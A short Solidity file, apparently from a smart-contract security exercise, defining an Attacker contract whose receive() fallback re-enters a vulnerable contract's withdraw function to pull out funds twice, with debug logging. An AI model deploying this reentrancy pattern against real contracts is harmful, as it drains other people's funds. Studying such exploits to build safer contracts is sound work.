pragma solidity >=0.6.0 <0.7.0;

import "./Reenterancy.sol";

contract Attacker {
    // event SetPurpose(address sender, string purpose);
    // event Withdraw(address sender, uint256 amount);
    Reenterancy reenterancy;
    bool hasAttacked;

    constructor(address payable contractAddress) public { 
        // hasAttacked = false;
        reenterancy = Reenterancy(contractAddress);
        // console.log("Reenterancy code: " + contractAddress.code);
        // console.log("Reenterancy balance: " + contractAddress.balance);
    }
    // new Reenterancy()

    function deposit() public payable {
        reenterancy.deposit{value:msg.value}();
    }

    function withdraw() public {
        console.log("Withdrawing from reenterancy with gas ", gasleft());
        reenterancy.withdraw();
    }

    receive() external payable {
        console.log("Not attacked yet with gas ", gasleft());
        if(!hasAttacked){
            console.log("Withdrawing from reenterancy");
            reenterancy.withdraw();
            hasAttacked = true;
        }
        console.log("Done attacking");
    }
}
